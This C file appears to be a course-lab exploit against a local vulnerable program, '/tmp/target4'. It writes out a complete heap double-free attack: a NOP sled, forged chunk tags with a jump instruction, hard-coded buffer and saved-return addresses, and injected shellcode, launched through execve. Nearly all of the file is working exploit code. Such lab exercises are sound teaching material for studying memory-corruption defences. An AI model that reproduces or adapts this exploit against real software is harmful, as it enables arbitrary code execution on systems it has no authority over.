#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
	// Create the sploitstring with null character and NOOP.
	char sploitstring[1024];
	sploitstring[sizeof(sploitstring) - 1] = 0;
	memset(&sploitstring, '\x90', sizeof(sploitstring));

	int BUFFER_ADDRESS = 0x804a068;

	// q is double free()d. The corresponding chunk is 500 bytes in.
	int* l_tag = (int*)(sploitstring + 504);
	int* r_tag = (int*)(sploitstring + 508);

	// The left tag bytes will be a jump forward by 6 bytes, to put us into our
	// shellcode.
	*(char*)(l_tag) = '\xEB';
	*((char*)(l_tag) + 1) = '\x06';
	// We just need these to avoid a segmentation fault.
	*((char*)(l_tag) + 2) = '\xff';
	*((char*)(l_tag) + 3) = '\xbf';

	// The right tag points to the bottom of our buffer.
	*r_tag = BUFFER_ADDRESS;
	// We add the chunk to our buffer. The l_tag (bottom) we leave as NOOP.
	// The r_tag (top) is a pointer to another chunk containing eip (bottom) and
	// trash (vp) (top). We force this chunk to be free to trigger re-wiring code.
	int EIP_ADDRESS = 0xbffffa5c;
	*(int*)(sploitstring + 4) = (EIP_ADDRESS | 0x01);

	// We add the exploit code on top of r_tag, which is skipped by the jump
	// instruction in l_tag.
	memcpy(r_tag + 1, shellcode, sizeof(shellcode) - 1);

	char *args[] = { TARGET, sploitstring, NULL };
	char *env[] = { NULL };

	execve(TARGET, args, env);
	fprintf(stderr, "execve failed.\n");

	return 0;
}
